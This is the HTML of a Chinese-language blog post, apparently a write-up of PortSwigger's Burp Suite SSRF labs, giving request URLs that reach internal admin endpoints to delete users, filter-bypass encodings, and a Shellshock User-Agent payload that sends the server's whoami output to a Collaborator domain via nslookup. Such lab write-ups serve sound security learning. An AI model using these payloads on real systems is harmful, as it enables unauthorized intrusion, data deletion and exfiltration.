@@ -1,0 +1,254 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light /dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>burpsuite实验室ssrf通关记录 | h11ba1's blog</title><meta name="keywords" content="ssrf漏洞,burpsuite实验室"><meta name="author" content="h11ba1"><meta name="copyright" content="h11ba1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.针对本地服务器的基本SSRF库存查询按钮处，点击时会将url作为参数进行查询  访问：http:&#x2F;&#x2F;localhost 发现存在&#x2F;admin目录  访问：http:&#x2F;&#x2F;localhost&#x2F;admin 发现存在删除用户接口  访问：http:&#x2F;&#x2F;localhost&#x2F;admin&#x2F;delete?username&#x3D;wiener即可删除用户 2.针对另一个后端系统的基本SSRF利用ssrf进行内网探测">
+<meta property="og:type" content="article">
+<meta property="og:title" content="burpsuite实验室ssrf通关记录">
+<meta property="og:url" content="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="h11ba1&#39;s blog">
+<meta property="og:description" content="1.针对本地服务器的基本SSRF库存查询按钮处，点击时会将url作为参数进行查询  访问：http:&#x2F;&#x2F;localhost 发现存在&#x2F;admin目录  访问：http:&#x2F;&#x2F;localhost&#x2F;admin 发现存在删除用户接口  访问：http:&#x2F;&#x2F;localhost&#x2F;admin&#x2F;delete?username&#x3D;wiener即可删除用户 2.针对另一个后端系统的基本SSRF利用ssrf进行内网探测">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png">
+<meta property="article:published_time" content="2019-07-05T13:04:49.000Z">
+<meta property="article:modified_time" content="2021-07-18T11:41:11.042Z">
+<meta property="article:author" content="h11ba1">
+<meta property="article:tag" content="ssrf漏洞">
+<meta property="article:tag" content="burpsuite实验室">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'burpsuite实验室ssrf通关记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-18 19:41:11'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="h11ba1's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友情连接</span></a></li><li><a class="site-page child" href="/bangumis"><i class="fa-fw bangumis"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h11ba1's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友情连接</span></a></li><li><a class="site-page child" href="/bangumis"><i class="fa-fw bangumis"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">burpsuite实验室ssrf通关记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-07-05T13:04:49.000Z" title="发表于 2019-07-05 21:04:49">2019-07-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-18T11:41:11.042Z" title="更新于 2021-07-18 19:41:11">2021-07-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="burpsuite实验室ssrf通关记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="1-针对本地服务器的基本SSRF"><a href="#1-针对本地服务器的基本SSRF" class="headerlink" title="1.针对本地服务器的基本SSRF"></a>1.针对本地服务器的基本SSRF</h2><p>库存查询按钮处，点击时会将url作为参数进行查询</p>
+<p><img src="1.1.png" alt="1.1"></p>
+<p>访问：<a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a></p>
+<p>发现存在/admin目录</p>
+<p><img src="1.2.png" alt="1.2"></p>
+<p>访问：<a target="_blank" rel="noopener" href="http://localhost/admin">http://localhost/admin</a></p>
+<p>发现存在删除用户接口</p>
+<p><img src="1.3.png" alt="1.3"></p>
+<p>访问：<a target="_blank" rel="noopener" href="http://localhost/admin/delete?username=wiener%E5%8D%B3%E5%8F%AF%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7">http://localhost/admin/delete?username=wiener即可删除用户</a></p>
+<h2 id="2-针对另一个后端系统的基本SSRF"><a href="#2-针对另一个后端系统的基本SSRF" class="headerlink" title="2.针对另一个后端系统的基本SSRF"></a>2.针对另一个后端系统的基本SSRF</h2><p>利用ssrf进行内网探测</p>
+<p>使用bp intruder爆破内网8080端口，得到一个和其他访问不一样的status。说明该ip8080端口存在服务</p>
+<p><img src="2.1.png" alt="2.1"></p>
+<p>访问admin目录</p>
+<p><img src="2.2.png" alt="2.2"></p>
+<p>发现删除用户的连接</p>
+<p>访问：<a target="_blank" rel="noopener" href="http://192.168.0.122:8080/admin/delete?username=carlos">http://192.168.0.122:8080/admin/delete?username=carlos</a></p>
+<p>即可删除carlos用户</p>
+<h2 id="3-具有基于黑名单的输入过滤器的SSRF"><a href="#3-具有基于黑名单的输入过滤器的SSRF" class="headerlink" title="3.具有基于黑名单的输入过滤器的SSRF"></a>3.具有基于黑名单的输入过滤器的SSRF</h2><p>黑名单过滤了：</p>
+<p>127.0.0.1 和localhost</p>
+<ol>
+<li>可以使用代替ip进行绕过：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如2130706433，017700000001，或127.1</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>注册域名，解析为127.0.0.1</li>
+</ol>
+<p>burp提供的spoofed.burpcollaborator.net即可解析为127.0.0.1</p>
+<p><img src="3.1.png" alt="3.1"></p>
+<p>访问：<a target="_blank" rel="noopener" href="http://spoofed.burpcollaborator.net/">http://spoofed.burpcollaborator.net</a></p>
+<p><img src="3.2.png" alt="3.2"></p>
+<p>访问：/admin，发现admin在黑名单中，这里可以采用大小写和url编码绕过（这里需要进行两次编码，因为bp发出时进行了一次解码，服务器再发出时又进行了一次解码）</p>
+<p><img src="3.3.png" alt="3.3"></p>
+<p>发现用户删除链接，访问<a target="_blank" rel="noopener" href="http://spoofed.burpcollaborator.net/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65//admin/delete?username=%5Bcarlos%5D(http://192.168.0.122:8080/admin/delete?username=carlos)%E5%8D%B3%E5%8F%AF%E5%88%A0%E9%99%A4">http://spoofed.burpcollaborator.net/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65//admin/delete?username=[carlos](http://192.168.0.122:8080/admin/delete?username=carlos)即可删除</a></p>
+<h2 id="4-具有基于白名单的输入过滤器的SSRF"><a href="#4-具有基于白名单的输入过滤器的SSRF" class="headerlink" title="4.具有基于白名单的输入过滤器的SSRF"></a>4.具有基于白名单的输入过滤器的SSRF</h2><p>ssrf访问：<a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a></p>
+<p>报错并，提示只能访问stock.weliketoshop.net</p>
+<p>此时尝试绕过该白名单限制：</p>
+<p>最终看了wp才发现绕过方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%2523@stock.weliketoshop.net</span><br></pre></td></tr></table></figure>
+
+
+
+<p>@前面的url编码时二次编码的#</p>
+<p>访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-带外检测的盲SSRF"><a href="#5-带外检测的盲SSRF" class="headerlink" title="5.带外检测的盲SSRF"></a>5.带外检测的盲SSRF</h2><p>更具提示：网页会在加载产品页面时获取Referer标头中指定的URL</p>
+<p>更改referer标头为burp collaborator客户端网址</p>
+<p><img src="5.1.png" alt="5.1"></p>
+<p>发送请求：</p>
+<p>burp collaborator客户端收到请求，证明存在漏洞</p>
+<p><img src="5.2.png" alt="5.2"></p>
+<h2 id="6-使用Shellshock进行盲SSRF"><a href="#6-使用Shellshock进行盲SSRF" class="headerlink" title="6.使用Shellshock进行盲SSRF"></a>6.使用Shellshock进行盲SSRF</h2><p>发现无法回显的ssrf。获取敏感信息证明危害：</p>
+<p>首先安装：Collaborator Everywhere插件</p>
+<p>然后将攻击的域名设置到范围中，这样Collaborator Everywhere才能对流量进行修改</p>
+<p><img src="6.1.png" alt="6.1"></p>
+<p>再次抓包：</p>
+<p><img src="6.2.png" alt="6.2"></p>
+<p>Collaborator Everywhere已经添加了许多Shellshock paylod</p>
+<p>对目标内网进行探测，并获取主机名：</p>
+<p>更改user-agent为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; /usr/bin/nslookup $(whoami).t60giu97fmygladioymhxtjyxp3fr4.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+
+<p>将域名更改为Burp Collaborator中的域名</p>
+<p>更改Referer为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://192.168.0.§1§:8080</span><br></pre></td></tr></table></figure>
+
+<p>对内网服务进行探测。点击开始攻击。几秒之后机会返回内网机器dns查询，并带上自己的主机名</p>
+<p><img src="6.3.png" alt="6.3"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h11ba1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">http://example.com/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">h11ba1's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ssrf%E6%BC%8F%E6%B4%9E/">ssrf漏洞</a><a class="post-meta__tags" href="/tags/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4/">burpsuite实验室</a></div><div class="post_share"><div class="social-share" data-image="/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/alipay.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/07/05/Thinkphp%205.0.15%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%86%E6%9E%90/"><img class="prev-cover" src="/2019/07/05/Thinkphp%205.0.15%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%86%E6%9E%90/index.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Thinkphp 5.0.15 SQL注入漏洞挖掘分析</div></div></a></div><div class="next-post pull-right"><a href="/2019/07/05/clarles%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"><img class="next-cover" src="/2019/07/05/clarles%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/index.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">clarles使用教程</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2019/07/05/burpsuite实验室xxe漏洞通关记录/" title="burpsuite实验室xxe漏洞通关及知识点讲解"><img class="cover" src="/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4xxe%E6%BC%8F%E6%B4%9E%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-07-05</div><div class="title">burpsuite实验室xxe漏洞通关及知识点讲解</div></div></a></div><div><a href="/2019/07/05/burpsuite实验室sql注入通关记录/" title="burpsuite实验室sql注入通关记录"><img class="cover" src="/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4sql%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-07-05</div><div class="title">burpsuite实验室sql注入通关记录</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h11ba1</div><div class="author-info__description">网络安全爱好者，一个正直的白帽子</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h1iba1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h1iba1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:h11ba1@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">好好学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%92%88%E5%AF%B9%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%ACSSRF"><span class="toc-number">1.</span> <span class="toc-text">1.针对本地服务器的基本SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%92%88%E5%AF%B9%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%90%8E%E7%AB%AF%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%9F%BA%E6%9C%ACSSRF"><span class="toc-number">2.</span> <span class="toc-text">2.针对另一个后端系统的基本SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B7%E6%9C%89%E5%9F%BA%E4%BA%8E%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84SSRF"><span class="toc-number">3.</span> <span class="toc-text">3.具有基于黑名单的输入过滤器的SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%85%B7%E6%9C%89%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84SSRF"><span class="toc-number">4.</span> <span class="toc-text">4.具有基于白名单的输入过滤器的SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%B8%A6%E5%A4%96%E6%A3%80%E6%B5%8B%E7%9A%84%E7%9B%B2SSRF"><span class="toc-number">5.</span> <span class="toc-text">5.带外检测的盲SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%BD%BF%E7%94%A8Shellshock%E8%BF%9B%E8%A1%8C%E7%9B%B2SSRF"><span class="toc-number">6.</span> <span class="toc-text">6.使用Shellshock进行盲SSRF</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/01/arl_poc%E7%BC%96%E5%86%99/" title="arl_poc编写"><img src="/2021/07/01/arl_poc%E7%BC%96%E5%86%99/index.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="arl_poc编写"/></a><div class="content"><a class="title" href="/2021/07/01/arl_poc%E7%BC%96%E5%86%99/" title="arl_poc编写">arl_poc编写</a><time datetime="2021-07-01T13:04:49.000Z" title="发表于 2021-07-01 21:04:49">2021-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/05/hugo+github%20page%E6%90%AD%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E7%9A%84https%E5%8D%9A%E5%AE%A2/" title="hugo+github page搭建自定义域名的https博客"><img src="/2021/06/05/hugo+github%20page%E6%90%AD%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E7%9A%84https%E5%8D%9A%E5%AE%A2/index.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hugo+github page搭建自定义域名的https博客"/></a><div class="content"><a class="title" href="/2021/06/05/hugo+github%20page%E6%90%AD%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E7%9A%84https%E5%8D%9A%E5%AE%A2/" title="hugo+github page搭建自定义域名的https博客">hugo+github page搭建自定义域名的https博客</a><time datetime="2021-06-05T13:04:49.000Z" title="发表于 2021-06-05 21:04:49">2021-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/05/1.webgoat%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/" title="1.webgoat环境构建"><img src="/2020/07/05/1.webgoat%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/index.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="1.webgoat环境构建"/></a><div class="content"><a class="title" href="/2020/07/05/1.webgoat%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/" title="1.webgoat环境构建">1.webgoat环境构建</a><time datetime="2020-07-05T13:04:49.000Z" title="发表于 2020-07-05 21:04:49">2020-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/05/3.sql%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/" title="3.sql注入模块审计"><img src="/2020/07/05/3.sql%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/index.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="3.sql注入模块审计"/></a><div class="content"><a class="title" href="/2020/07/05/3.sql%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/" title="3.sql注入模块审计">3.sql注入模块审计</a><time datetime="2020-07-05T13:04:49.000Z" title="发表于 2020-07-05 21:04:49">2020-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/05/2.%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/" title="2.登录注册模块审计"><img src="/2020/07/05/2.%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/index.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2.登录注册模块审计"/></a><div class="content"><a class="title" href="/2020/07/05/2.%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/" title="2.登录注册模块审计">2.登录注册模块审计</a><time datetime="2020-07-05T13:04:49.000Z" title="发表于 2020-07-05 21:04:49">2020-07-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> h11ba1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div 